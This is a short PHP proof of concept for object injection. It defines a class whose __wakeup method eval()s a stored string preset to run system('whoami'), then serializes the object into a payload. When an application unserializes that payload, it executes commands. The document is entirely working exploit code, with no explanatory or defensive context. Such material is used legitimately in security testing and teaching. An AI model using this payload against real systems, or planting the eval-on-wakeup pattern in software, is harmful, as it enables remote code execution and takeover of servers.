<?php 
    class PHPObjectInjection{
        public $inject = "echo system('whoami');";
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }

echo $haha=serialize(array(new PHPObjectInjection));
?>
